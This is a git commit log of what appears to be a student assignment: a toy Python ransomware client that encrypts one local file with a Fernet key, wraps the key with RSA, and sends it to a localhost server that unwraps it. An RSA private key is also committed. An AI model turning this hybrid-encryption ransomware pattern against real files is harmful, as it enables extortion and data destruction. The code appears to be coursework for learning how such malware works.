commit aae5f04a7f2f8501ae5fa558851afc2285c63b28
Author: LemonSauc3 <riley@boyder.ca>
Date:   Sun Feb 12 22:42:14 2023 -0500

    Minor changes

diff --git a/keys/encryptedSymmertricKey.key b/keys/encryptedSymmertricKey.key
index 23e8d8d..5238516 100644
Binary files a/keys/encryptedSymmertricKey.key and b/keys/encryptedSymmertricKey.key differ
diff --git a/ransomware/FileToEncrypt.txt b/ransomware/FileToEncrypt.txt
index 5e1c309..e69de29 100644
--- a/ransomware/FileToEncrypt.txt
+++ b/ransomware/FileToEncrypt.txt
@@ -1 +0,0 @@
-Hello World
\ No newline at end of file
diff --git a/ransomware/SecretTextFile.txt b/ransomware/SecretTextFile.txt
index 1b40d85..6ee6244 100644
--- a/ransomware/SecretTextFile.txt
+++ b/ransomware/SecretTextFile.txt
@@ -1 +1 @@
-gAAAAABj6a1Ym7B3W_3PgoVx9KfdIVfTUuVO2n2dK71b6TVQvfH5895mAMQobjyHE7cq2htSUlP1XjCaQoZwM9rbw2dvAJM8Rw==
\ No newline at end of file
+Insert what you want encrypted here
\ No newline at end of file
diff --git a/ransomware/decryptedTextFile.txt b/ransomware/decryptedTextFile.txt
index 5e1c309..e69de29 100644
--- a/ransomware/decryptedTextFile.txt
+++ b/ransomware/decryptedTextFile.txt
@@ -1 +0,0 @@
-Hello World
\ No newline at end of file

commit e8b12eaaf25b936819e49f0786888d81dd0e7985
Author: LemonSauc3 <riley@boyder.ca>
Date:   Sun Feb 12 22:38:13 2023 -0500

    Working Code for A1

diff --git a/.vscode/settings.json b/.vscode/settings.json
new file mode 100644
index 0000000..cc5a352
--- /dev/null
+++ b/.vscode/settings.json
@@ -0,0 +1,3 @@
+{
+  "python.analysis.typeCheckingMode": "off"
+}
diff --git a/keys/encryptedSymmertricKey.key b/keys/encryptedSymmertricKey.key
index 8dc1f39..23e8d8d 100644
Binary files a/keys/encryptedSymmertricKey.key and b/keys/encryptedSymmertricKey.key differ
diff --git a/ransom_client.py b/ransom_client.py
index a1bf421..6aa8bd9 100644
--- a/ransom_client.py
+++ b/ransom_client.py
@@ -1,7 +1,7 @@
 # Cryptography imports for encrypting the keys
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.asymmetric import padding, rsa
 from cryptography.hazmat.primitives import hashes
 from cryptography.fernet import Fernet
 
@@ -20,8 +20,8 @@ FernetInstance = Fernet(symmetricKey)
 # Opening the public_key to load into memory
 with open("./keys/public_key.key", "rb") as key_file:
     public_key = serialization.load_pem_public_key(
-    key_file.read(),
-    backend=default_backend()
+        key_file.read(),
+        backend=default_backend()
     )
 
 # Creating an encryptedSymmetricKey with the public_key for encryption
@@ -32,30 +32,43 @@ encryptedSymmetricKey = public_key.encrypt(
         mgf=padding.MGF1(algorithm=hashes.SHA256()),
         algorithm=hashes.SHA256(),
         label=None
-        )
     )
+)
 
 # Opening or creating the encrypted key file and writing the encryption to
 # it, reading the Fernet Instance and writing the data
 with open("./keys/encryptedSymmertricKey.key", "wb") as key_file:
     key_file.write(encryptedSymmetricKey)
-
     filePath = "./ransomware/SecretTextFile.txt"
 
     with open(filePath, "rb") as file:
         file_data = file.read()
+        print(file_data)
         encrypted_data = FernetInstance.encrypt(file_data)
 
     with open(filePath, "wb") as file:
         file.write(encrypted_data)
 
 
+def decryptFile(filePath, key):
+    FernetInstance = Fernet(key)
+    with open(filePath, "rb") as d_file:
+        file_data = d_file.read()
+        decrypted_data = FernetInstance.decrypt(file_data)
+
+    with open("./ransomware/decryptedTextFile.txt", "wb") as file:
+        file.write(decrypted_data)
+
+
 def sendEncryptedKey(eKeyFilePath):
-    with socket.create_connection(("", 8000)) as sock:
+    with socket.create_connection(("127.0.0.1", 8000)) as sock:
         with open(eKeyFilePath, "rb") as file:
-            pass
+            file_data = file.read()
+            sock.send(file_data)
+            decryptedSymmetricKey = sock.recv(1024).strip()
+            decryptFile("./ransomware/SecretTextFile.txt",
+                        decryptedSymmetricKey)
 
-def decryptFile(filePath, key):
-    pass
 
-quit()
\ No newline at end of file
+sendEncryptedKey("./keys/encryptedSymmertricKey.key")
+quit()
diff --git a/ransom_server.py b/ransom_server.py
index 478c3df..07f7462 100644
--- a/ransom_server.py
+++ b/ransom_server.py
@@ -1,26 +1,55 @@
+# Cryptography imports for encrypting the keys
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
+from cryptography.fernet import Fernet
+
+# Importing socketserver to create the server aspect for TCP/IP
 import socketserver
 
+# Using Fetnet to generate a token for the key
+symmetricKey = Fernet.generate_key()
+FernetInstance = Fernet(symmetricKey)
+
+
 class ClientHandler(socketserver.BaseRequestHandler):
 
     def handle(self):
         encrypted_key = self.request.recv(1024).strip()
-        print(f"Implement decryption of data {encrypted_key}")
+        print(f"Implement decryption of data {encrypted_key}\n")
 
-        #-----------------------------
+        # -----------------------------
         # Decryption Code Here
 
-
-
-        #-----------------------------
-
-        self.request.sendall("Send key back")
+        # Opening the private_key to load into memory
+        with open("./keys/pub_priv_pair.key", "rb") as key_file:
+            private_key = serialization.load_pem_private_key(
+                key_file.read(),
+                password=None,
+                backend=default_backend()
+            )
+        # Decrypting the symmetric key
+        decryptedSymmetricKey = private_key.decrypt(
+            encrypted_key,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
+
+        # -----------------------------
+        # Send the decrypted symmetric key back to the client
+        self.request.sendall(decryptedSymmetricKey)
 
 
 if __name__ == "__main__":
-    HOST, PORT = "", 8000
+    HOST, PORT = "127.0.0.1", 8000
 
     tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)
     try:
         tcpServer.serve_forever()
     except:
-        print("There was an error")
\ No newline at end of file
+        print("There was an error")
+        tcpServer.shutdown()
diff --git a/ransomware/FileToEncrypt.txt b/ransomware/FileToEncrypt.txt
new file mode 100644
index 0000000..5e1c309
--- /dev/null
+++ b/ransomware/FileToEncrypt.txt
@@ -0,0 +1 @@
+Hello World
\ No newline at end of file
diff --git a/ransomware/SecretTextFile.txt b/ransomware/SecretTextFile.txt
index 09037ef..1b40d85 100644
--- a/ransomware/SecretTextFile.txt
+++ b/ransomware/SecretTextFile.txt
@@ -1 +1 @@
-gAAAAABj6UAaIPmmufxs_ORzUZZRRrfuI4yc2tSxoVw75HQwRBITSMSnnB4nomsmRUfj0DsKUtSKK3FntkKcHh8ZBo3QHXcAi8qFoh2NRRZlFIJtKF0WevXPgVmmsmYHt2lAFvPEDAPmYt1QsILpXe0BBg5YetHBCBlyD1PdlNU5Bg83SEoVK-hesUFsccLvWoOp6DGO-XA8OcgVzsgwsL0W8nExGqJeEbvZ5lFWbVfSk0xLlG1WUXQEvleuzJJT7WriDPp5gMs9gcy8_JsRk3quNOlWvDQ1iQ==
\ No newline at end of file
+gAAAAABj6a1Ym7B3W_3PgoVx9KfdIVfTUuVO2n2dK71b6TVQvfH5895mAMQobjyHE7cq2htSUlP1XjCaQoZwM9rbw2dvAJM8Rw==
\ No newline at end of file
diff --git a/ransomware/decryptedTextFile.txt b/ransomware/decryptedTextFile.txt
new file mode 100644
index 0000000..5e1c309
--- /dev/null
+++ b/ransomware/decryptedTextFile.txt
@@ -0,0 +1 @@
+Hello World
\ No newline at end of file

commit 583f4ea0485927f5b5fd2f5eb90acc4f4d0ed0e3
Author: LemonSauc3 <riley@boyder.ca>
Date:   Sun Feb 12 18:43:52 2023 -0500

    Commented the client code

diff --git a/ransom_client.py b/ransom_client.py
index a712584..a1bf421 100644
--- a/ransom_client.py
+++ b/ransom_client.py
@@ -1,8 +1,11 @@
+# Cryptography imports for encrypting the keys
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.fernet import Fernet
+
+# Socket import for using TCP/IP to connect to the server
 import socket
 
 """
@@ -10,16 +13,19 @@ This file is used to encrypt a file using a symmetric key. The symmetric key is
 The encrypted key is then saved to a file. That key is then used to encrypt a file.
 """
 
+# Using Fetnet to generate a token for the key
 symmetricKey = Fernet.generate_key()
-
 FernetInstance = Fernet(symmetricKey)
 
+# Opening the public_key to load into memory
 with open("./keys/public_key.key", "rb") as key_file:
     public_key = serialization.load_pem_public_key(
     key_file.read(),
     backend=default_backend()
     )
 
+# Creating an encryptedSymmetricKey with the public_key for encryption
+# using SHA256
 encryptedSymmetricKey = public_key.encrypt(
     symmetricKey,
     padding.OAEP(
@@ -29,7 +35,8 @@ encryptedSymmetricKey = public_key.encrypt(
         )
     )
 
-
+# Opening or creating the encrypted key file and writing the encryption to
+# it, reading the Fernet Instance and writing the data
 with open("./keys/encryptedSymmertricKey.key", "wb") as key_file:
     key_file.write(encryptedSymmetricKey)
 

commit 85a387f29936c31cfe64ec9e6a3fbac0d1933da7
Author: LemonSauc3 <riley@boyder.ca>
Date:   Sun Feb 12 15:14:49 2023 -0500

    made changes

diff --git a/keys/encryptedSymmertricKey.key b/keys/encryptedSymmertricKey.key
new file mode 100644
index 0000000..8dc1f39
Binary files /dev/null and b/keys/encryptedSymmertricKey.key differ
diff --git a/ransom_client.py b/ransom_client.py
index f31e616..a712584 100644
--- a/ransom_client.py
+++ b/ransom_client.py
@@ -3,6 +3,7 @@ from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.fernet import Fernet
+import socket
 
 """
 This file is used to encrypt a file using a symmetric key. The symmetric key is encrypted using the public key of the recipient.
@@ -13,7 +14,7 @@ symmetricKey = Fernet.generate_key()
 
 FernetInstance = Fernet(symmetricKey)
 
-with open("/keys/public_key.key", "rb") as key_file:
+with open("./keys/public_key.key", "rb") as key_file:
     public_key = serialization.load_pem_public_key(
     key_file.read(),
     backend=default_backend()
@@ -28,10 +29,11 @@ encryptedSymmetricKey = public_key.encrypt(
         )
     )
 
-with open("/keys/encryptedSymmertricKey.key", "wb") as key_file:
+
+with open("./keys/encryptedSymmertricKey.key", "wb") as key_file:
     key_file.write(encryptedSymmetricKey)
 
-    filePath = "/ransomware/SecretTextFile.txt"
+    filePath = "./ransomware/SecretTextFile.txt"
 
     with open(filePath, "rb") as file:
         file_data = file.read()
@@ -39,4 +41,14 @@ with open("/keys/encryptedSymmertricKey.key", "wb") as key_file:
 
     with open(filePath, "wb") as file:
         file.write(encrypted_data)
+
+
+def sendEncryptedKey(eKeyFilePath):
+    with socket.create_connection(("", 8000)) as sock:
+        with open(eKeyFilePath, "rb") as file:
+            pass
+
+def decryptFile(filePath, key):
+    pass
+
 quit()
\ No newline at end of file
diff --git a/ransom_server.py b/ransom_server.py
index 6b8419f..478c3df 100644
--- a/ransom_server.py
+++ b/ransom_server.py
@@ -8,10 +8,14 @@ class ClientHandler(socketserver.BaseRequestHandler):
 
         #-----------------------------
         # Decryption Code Here
+
+
+
         #-----------------------------
 
         self.request.sendall("Send key back")
 
+
 if __name__ == "__main__":
     HOST, PORT = "", 8000
 
diff --git a/ransomware/SecretTextFile.txt b/ransomware/SecretTextFile.txt
index a21be40..09037ef 100644
--- a/ransomware/SecretTextFile.txt
+++ b/ransomware/SecretTextFile.txt
@@ -1,3 +1 @@
-This is a super important text file that hopefully no one will be able to read.
-
-It has all my important information. If a hacker were to get this 
\ No newline at end of file
+gAAAAABj6UAaIPmmufxs_ORzUZZRRrfuI4yc2tSxoVw75HQwRBITSMSnnB4nomsmRUfj0DsKUtSKK3FntkKcHh8ZBo3QHXcAi8qFoh2NRRZlFIJtKF0WevXPgVmmsmYHt2lAFvPEDAPmYt1QsILpXe0BBg5YetHBCBlyD1PdlNU5Bg83SEoVK-hesUFsccLvWoOp6DGO-XA8OcgVzsgwsL0W8nExGqJeEbvZ5lFWbVfSk0xLlG1WUXQEvleuzJJT7WriDPp5gMs9gcy8_JsRk3quNOlWvDQ1iQ==
\ No newline at end of file

commit ac1c43b1ee5eed8f015b8b560e2bf03eb4673d64
Author: LemonSauc3 <riley@boyder.ca>
Date:   Sun Feb 12 14:28:32 2023 -0500

    added the server

diff --git a/encrypt.py b/ransom_client.py
similarity index 73%
rename from encrypt.py
rename to ransom_client.py
index 97e3f89..f31e616 100644
--- a/encrypt.py
+++ b/ransom_client.py
@@ -4,6 +4,11 @@ from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.fernet import Fernet
 
+"""
+This file is used to encrypt a file using a symmetric key. The symmetric key is encrypted using the public key of the recipient.
+The encrypted key is then saved to a file. That key is then used to encrypt a file.
+"""
+
 symmetricKey = Fernet.generate_key()
 
 FernetInstance = Fernet(symmetricKey)
@@ -23,10 +28,10 @@ encryptedSymmetricKey = public_key.encrypt(
         )
     )
 
-with open("encryptedSymmertricKey.key", "wb") as key_file:
+with open("/keys/encryptedSymmertricKey.key", "wb") as key_file:
     key_file.write(encryptedSymmetricKey)
 
-    filePath = "/keys/FileToEncrypt.txt"
+    filePath = "/ransomware/SecretTextFile.txt"
 
     with open(filePath, "rb") as file:
         file_data = file.read()
diff --git a/ransom_server.py b/ransom_server.py
new file mode 100644
index 0000000..6b8419f
--- /dev/null
+++ b/ransom_server.py
@@ -0,0 +1,22 @@
+import socketserver
+
+class ClientHandler(socketserver.BaseRequestHandler):
+
+    def handle(self):
+        encrypted_key = self.request.recv(1024).strip()
+        print(f"Implement decryption of data {encrypted_key}")
+
+        #-----------------------------
+        # Decryption Code Here
+        #-----------------------------
+
+        self.request.sendall("Send key back")
+
+if __name__ == "__main__":
+    HOST, PORT = "", 8000
+
+    tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)
+    try:
+        tcpServer.serve_forever()
+    except:
+        print("There was an error")
\ No newline at end of file
diff --git a/ransomware/SecretTextFile.txt b/ransomware/SecretTextFile.txt
new file mode 100644
index 0000000..a21be40
--- /dev/null
+++ b/ransomware/SecretTextFile.txt
@@ -0,0 +1,3 @@
+This is a super important text file that hopefully no one will be able to read.
+
+It has all my important information. If a hacker were to get this 
\ No newline at end of file

commit 3c3ae0684e8fa99d06a2bbcbaeafff048d6d82dc
Author: LemonSauc3 <riley@boyder.ca>
Date:   Sun Feb 12 14:07:28 2023 -0500

    Initial files for A1

diff --git a/encrypt.py b/encrypt.py
new file mode 100644
index 0000000..97e3f89
--- /dev/null
+++ b/encrypt.py
@@ -0,0 +1,37 @@
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
+from cryptography.fernet import Fernet
+
+symmetricKey = Fernet.generate_key()
+
+FernetInstance = Fernet(symmetricKey)
+
+with open("/keys/public_key.key", "rb") as key_file:
+    public_key = serialization.load_pem_public_key(
+    key_file.read(),
+    backend=default_backend()
+    )
+
+encryptedSymmetricKey = public_key.encrypt(
+    symmetricKey,
+    padding.OAEP(
+        mgf=padding.MGF1(algorithm=hashes.SHA256()),
+        algorithm=hashes.SHA256(),
+        label=None
+        )
+    )
+
+with open("encryptedSymmertricKey.key", "wb") as key_file:
+    key_file.write(encryptedSymmetricKey)
+
+    filePath = "/keys/FileToEncrypt.txt"
+
+    with open(filePath, "rb") as file:
+        file_data = file.read()
+        encrypted_data = FernetInstance.encrypt(file_data)
+
+    with open(filePath, "wb") as file:
+        file.write(encrypted_data)
+quit()
\ No newline at end of file
diff --git a/keys/pub_priv_pair.key b/keys/pub_priv_pair.key
new file mode 100644
index 0000000..24b5e23
--- /dev/null
+++ b/keys/pub_priv_pair.key
@@ -0,0 +1,16 @@
+-----BEGIN PRIVATE KEY-----
+MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBALpqoquojABGScu7
+z3TXVLA0fayDDG7QooiCGKA7TF9sRgs2gWUQCrbZTVYzqgneiDyoG52wpmgWDGmG
+gS0KfxGT6TBdNF8MNSDhyanucyolYfwFPBpr6slrw0HHb0wcPD25VEvgH41EGfMf
+nXqmWwrFsOYvWyQ5/kuqfYJwkvk7AgMBAAECgYB0y7zxuh9FSMSRrjETrpoz8B9R
+R6Yxg+xhhMkzExQNsUPNYK//huZ/m3R17ta5akCHaHgs+3G3QyExuIEUnD/xy43i
+5buw+KCSD/ezbDzS4g08kdFb5nW1YK4IAYBAkHHBKJu0HUqGEDdZz+9PUNRLm8FR
+UDLqNme19vR9HFZL2QJBAO9ObjV5Cuv0lgXmYcYjy/TK/g9AaX5o6gQ7xde0wdGX
+TqVFXq2XyBKC6zwxXepx3hlUGSvcf4RPxYy5qlfYqQUCQQDHa7C+h/6ah0nlok7y
+hboVLoCGrUR72j5H0T95174nMTP3/aojRS6pB8V5sELp/LYKXmC1b42Txabsygji
+Na0/AkEAp8rWe6fjgI5+oqRm6gcvevTaLtd7IKdvboh6sESNoef1vOxm9lD2eART
+7GCw+THeCORuwdJZluxYF9QXHIFOAQJAE1J955gptTNSl6toVttaMl81GNeFATMe
+QbsmmVmsFQQRcv/jElPLt5kHK0lG0oEn6k1GtY2/fAf0qpDQ14o35QJAK34RHLLA
+mZ8HyDfmdWNle81wWhj885t7pzZTve0UKAUVcfNLcjW5GoBNxMFkyAyUAfKXdcbn
+kUd2+sif0D0Y8Q==
+-----END PRIVATE KEY-----
diff --git a/keys/public_key.key b/keys/public_key.key
new file mode 100644
index 0000000..b869f79
--- /dev/null
+++ b/keys/public_key.key
@@ -0,0 +1,6 @@
+-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC6aqKrqIwARknLu89011SwNH2s
+gwxu0KKIghigO0xfbEYLNoFlEAq22U1WM6oJ3og8qBudsKZoFgxphoEtCn8Rk+kw
+XTRfDDUg4cmp7nMqJWH8BTwaa+rJa8NBx29MHDw9uVRL4B+NRBnzH516plsKxbDm
+L1skOf5Lqn2CcJL5OwIDAQAB
+-----END PUBLIC KEY-----
